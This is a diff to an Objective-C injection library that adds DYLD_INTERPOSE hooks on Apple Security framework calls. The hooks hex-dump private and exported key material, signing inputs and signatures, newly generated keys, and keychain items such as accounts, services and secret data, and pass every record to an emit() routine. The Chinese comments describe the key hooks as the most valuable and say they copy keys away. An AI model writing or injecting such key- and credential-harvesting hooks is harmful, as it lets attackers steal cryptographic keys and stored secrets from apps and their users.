@@ -823,6 +823,160 @@ static CFDataRef my_SecKeyCreateSignature(SecKeyRef key, SecKeyAlgorithm alg,
 }
 DYLD_INTERPOSE(my_SecKeyCreateSignature, SecKeyCreateSignature)
 
+// ── ★ 密钥获取类（这几个人最值钱）──
+
+// ① SecKeyCreateWithData：从原始字节造密钥 → 直接抄走密钥
+static SecKeyRef my_SecKeyCreateWithData(CFDataRef keyData, CFDictionaryRef attributes, CFErrorRef *err) {
+    if (cfgOn(@"L1") && rateGate("KeyFromData", cfgRate())) {
+        NSMutableDictionary *d = base(@"L1", @"SecKeyCreateWithData");
+        d[@"keyLen"] = @(CFDataGetLength(keyData));
+        d[@"keyData"] = hexStr(CFDataGetBytePtr(keyData), CFDataGetLength(keyData), 8192);
+        // 把 attributes 里的关键项也打出来（类型/位数）
+        if (attributes) {
+            CFTypeRef t = CFDictionaryGetValue(attributes, kSecAttrKeyType);
+            CFTypeRef sz = CFDictionaryGetValue(attributes, kSecAttrKeySizeInBits);
+            if (t)  d[@"keyType"] = (__bridge id)t;
+            if (sz) d[@"keyBits"] = (__bridge id)sz;
+        }
+        emit(d);
+    }
+    return SecKeyCreateWithData(keyData, attributes, err);
+}
+DYLD_INTERPOSE(my_SecKeyCreateWithData, SecKeyCreateWithData)
+
+// ② SecKeyCopyExternalRepresentation：导出密钥
+static CFDataRef my_SecKeyCopyExternalRepresentation(SecKeyRef key, CFErrorRef *err) {
+    CFDataRef out = SecKeyCopyExternalRepresentation(key, err);
+    if (cfgOn(@"L1") && out && rateGate("KeyExport", cfgRate())) {
+        NSMutableDictionary *d = base(@"L1", @"SecKeyCopyExternalRepresentation");
+        d[@"keyLen"] = @(CFDataGetLength(out));
+        d[@"keyData"] = hexStr(CFDataGetBytePtr(out), CFDataGetLength(out), 8192);
+        @try {
+            SecKeyRef cp = SecKeyCreateWithData(out,
+                (__bridge CFDictionaryRef)@{(__bridge id)kSecAttrKeyType:(__bridge id)kSecAttrKeyTypeRSA,
+                                            (__bridge id)kSecAttrKeyClass:(__bridge id)kSecAttrKeyClassPublic},
+                NULL);
+            if (cp) {
+                d[@"keyClass"] = @"RSA-public";
+                CFRelease(cp);
+            }
+        } @catch (__unused NSException *e) {}
+        emit(d);
+    }
+    return out;
+}
+DYLD_INTERPOSE(my_SecKeyCopyExternalRepresentation, SecKeyCopyExternalRepresentation)
+
+// ③ RawSign / RawVerify（老 API）
+static OSStatus my_SecKeyRawSign(SecKeyRef key, SecPadding pad,
+    const uint8_t *data, size_t dataLen, uint8_t *sig, size_t *sigLen) {
+    if (cfgOn(@"L1") && rateGate("RawSign", cfgRate())) {
+        NSMutableDictionary *d = base(@"L1", @"SecKeyRawSign");
+        d[@"alg"] = [NSString stringWithFormat:@"RSA/pad%u", pad];
+        d[@"inLen"] = @(dataLen);
+        d[@"in"] = hexStr(data, dataLen, 4096);
+        NSString *t = tryUTF8(data, dataLen); if (t) d[@"inText"] = t;
+        emit(d);
+    }
+    OSStatus r = SecKeyRawSign(key, pad, data, dataLen, sig, sigLen);
+    if (cfgOn(@"L1") && sig && sigLen && rateGate("RawSignOut", cfgRate())) {
+        NSMutableDictionary *d = base(@"L1", @"SecKeyRawSign.out");
+        d[@"sigLen"] = @(*sigLen);
+        d[@"sig"] = hexStr(sig, *sigLen, 512);
+        emit(d);
+    }
+    return r;
+}
+DYLD_INTERPOSE(my_SecKeyRawSign, SecKeyRawSign)
+
+static OSStatus my_SecKeyRawVerify(SecKeyRef key, SecPadding pad,
+    const uint8_t *data, size_t dataLen, const uint8_t *sig, size_t sigLen) {
+    if (cfgOn(@"L1") && rateGate("RawVerify", cfgRate())) {
+        NSMutableDictionary *d = base(@"L1", @"SecKeyRawVerify");
+        d[@"alg"] = [NSString stringWithFormat:@"RSA/pad%u", pad];
+        d[@"inLen"] = @(dataLen);
+        d[@"in"] = hexStr(data, dataLen, 4096);
+        d[@"sig"] = hexStr(sig, sigLen, 512);
+        emit(d);
+    }
+    return SecKeyRawVerify(key, pad, data, dataLen, sig, sigLen);
+}
+DYLD_INTERPOSE(my_SecKeyRawVerify, SecKeyRawVerify)
+
+// ④ SecKeyCreateRandomKey（新生成的密钥）
+static SecKeyRef my_SecKeyCreateRandomKey(CFDictionaryRef params, CFErrorRef *err) {
+    SecKeyRef k = SecKeyCreateRandomKey(params, err);
+    if (cfgOn(@"L1") && k && rateGate("KeyGen", cfgRate())) {
+        NSMutableDictionary *d = base(@"L1", @"SecKeyCreateRandomKey");
+        CFErrorRef e2 = NULL;
+        CFDataRef ext = SecKeyCopyExternalRepresentation(k, &e2);
+        if (ext) {
+            d[@"keyLen"] = @(CFDataGetLength(ext));
+            d[@"keyData"] = hexStr(CFDataGetBytePtr(ext), CFDataGetLength(ext), 4096);
+            CFRelease(ext);
+        }
+        emit(d);
+    }
+    return k;
+}
+DYLD_INTERPOSE(my_SecKeyCreateRandomKey, SecKeyCreateRandomKey)
+
+// ⑤ SecItemCopyMatching：Keychain 里的密钥
+static OSStatus my_SecItemCopyMatching(CFDictionaryRef query, CFTypeRef *result) {
+    OSStatus st = SecItemCopyMatching(query, result);
+    if (cfgOn(@"L1") && rateGate("Keychain", cfgRate())) {
+        NSMutableDictionary *d = base(@"L1", @"SecItemCopyMatching");
+        d[@"status"] = @(st);
+        if (query) {
+            @try {
+                NSDictionary *q = (__bridge NSDictionary *)query;
+                NSString *cls = q[(__bridge id)kSecClass];
+                NSString *acct = q[(__bridge id)kSecAttrAccount];
+                NSString *svc  = q[(__bridge id)kSecAttrService];
+                if (cls)  d[@"class"]   = cls;
+                if (acct) d[@"account"] = acct;
+                if (svc)  d[@"service"] = svc;
+            } @catch (__unused NSException *e) {}
+        }
+        if (st == errSecSuccess && result && *result) {
+            CFTypeRef r = *result;
+            if (CFGetTypeID(r) == CFDataGetTypeID()) {
+                CFDataRef dd = (CFDataRef)r;
+                d[@"dataLen"] = @(CFDataGetLength(dd));
+                d[@"data"] = hexStr(CFDataGetBytePtr(dd), CFDataGetLength(dd), 4096);
+            } else if (CFGetTypeID(r) == CFStringGetTypeID()) {
+                d[@"string"] = (__bridge id)r;
+            }
+        }
+        emit(d);
+    }
+    return st;
+}
+DYLD_INTERPOSE(my_SecItemCopyMatching, SecItemCopyMatching)
+
+// ⑥ SecItemAdd：往 Keychain 存密钥
+static OSStatus my_SecItemAdd(CFDictionaryRef attrs, CFTypeRef *result) {
+    if (cfgOn(@"L1") && rateGate("KeychainAdd", cfgRate())) {
+        NSMutableDictionary *d = base(@"L1", @"SecItemAdd");
+        if (attrs) {
+            @try {
+                NSDictionary *a = (__bridge NSDictionary *)attrs;
+                id data = a[(__bridge id)kSecValueData];
+                id acct = a[(__bridge id)kSecAttrAccount];
+                if (acct) d[@"account"] = acct;
+                if ([data isKindOfClass:[NSData class]]) {
+                    d[@"dataLen"] = @([data length]);
+                    d[@"data"] = hexStr([data bytes], [data length], 4096);
+                }
+            } @catch (__unused NSException *e) {}
+        }
+        emit(d);
+    }
+    return SecItemAdd(attrs, result);
+}
+DYLD_INTERPOSE(my_SecItemAdd, SecItemAdd)
+
+
 
 
 // ============================================================
